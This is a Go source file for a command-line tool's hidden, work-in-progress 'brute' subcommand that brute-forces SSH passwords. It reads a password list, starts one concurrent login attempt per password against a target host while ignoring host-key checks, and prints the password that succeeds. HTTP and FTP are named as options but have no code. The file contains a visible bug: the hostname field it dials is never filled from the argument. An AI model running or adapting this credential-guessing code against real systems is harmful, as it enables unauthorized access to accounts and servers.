/*
Copyright © 2021 NAME HERE <EMAIL ADDRESS>

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
package cmd

import (
	"errors"
	"fmt"
	"os"
	"strings"
	"sync"

	"github.com/fatih/color"
	"github.com/go-ping/ping"
	"github.com/spf13/cobra"
	"golang.org/x/crypto/ssh"
)

// bruteCmd represents the brute command
type response struct {
	Hostname string
	Service  string
	Port     int
	Username string
	ListPath string
}

var answers = response{}

var bruteCmd = &cobra.Command{
	Use:   "brute",
	Short: "crack a password",
	Args: func(cmd *cobra.Command, args []string) error {
		if len(args) != 1 {
			return errors.New(color.RedString("expected 1 argument, got " + fmt.Sprint(len(args))))
		}
		if _, err := ping.NewPinger(args[0]); err != nil {
			return errors.New(color.RedString("invalid hostname"))
		}
		if answers.Service == "" {
			return errors.New(color.RedString("need the service to brute force"))
		}
		return nil
	},
	RunE: func(cmd *cobra.Command, args []string) error {
		if answers.Port == 0 { //! u was here
			switch s := answers.Service; s {
			case "http":
				answers.Port = 80
			case "ssh":
				answers.Port = 22
			case "ftp":
				answers.Port = 21
			}
		}
		passwords, err := readFile(answers.ListPath)
		if err != nil {
			return errors.New(color.RedString(err.Error()))
		}
		wg := sync.WaitGroup{}
		s := strings.Split(args[0], "@")
		if len(s) == 2 {
			answers.Username = s[0]
		}

		// brute force
		switch answers.Service {
		case "ssh":
			wg.Add(len(passwords))
			for _, pass := range passwords {
				sshConfig := &ssh.ClientConfig{
					User: answers.Username,
					Auth: []ssh.AuthMethod{ssh.Password(pass)},
				}
				sshConfig.HostKeyCallback = ssh.InsecureIgnoreHostKey()
				go func(p string) {
					defer wg.Done()
					client, err := ssh.Dial("tcp", answers.Hostname+":"+fmt.Sprint(answers.Port), sshConfig)
					if err != nil {
						if strings.Contains(err.Error(), "unable to authenticate") {
							fmt.Println(color.RedString("[-] ") + "tried " + color.CyanString(p))
							return
						} else {
							color.Red(err.Error())
						}
					}
					if client != nil {
						err = client.Close()
					}
					if err == nil {
						fmt.Println(color.GreenString("[+] ") + "correct password is " + color.CyanString(p))
						os.Exit(0)
					}
				}(pass)

			}
		}
		wg.Wait()
		return nil
	},
}

func init() {
	rootCmd.AddCommand(bruteCmd)
	bruteCmd.Flags().StringVarP(&answers.Service, "service", "s", "", "the service to brute force, accepted values are ftp, http, and ssh")
	bruteCmd.Flags().StringVarP(&answers.Username, "username", "u", "", "the username of the user to attempt to login to")
	bruteCmd.Flags().IntVarP(&answers.Port, "port", "p", 0, "the port the service is running on")
	bruteCmd.Flags().StringVarP(&answers.ListPath, "passwords", "P", "", "list of passwords to try (required)")
	bruteCmd.Flags().Lookup("port").Usage = "the port to brute force (required)"
	bruteCmd.Flags().Lookup("username").Usage = "the username of the user to attempt to login to"
	bruteCmd.Flags().Lookup("service").Usage = "the service to brute force, accepted values are ftp, http, and ssh"

	bruteCmd.Hidden = true // wip
	// Here you will define your flags and configuration settings.

	// Cobra supports Persistent Flags which will work for this command
	// and all subcommands, e.g.:
	// bruteCmd.PersistentFlags().String("foo", "", "A help for foo")

	// Cobra supports local flags which will only run when this command
	// is called directly, e.g.:
	// bruteCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
}
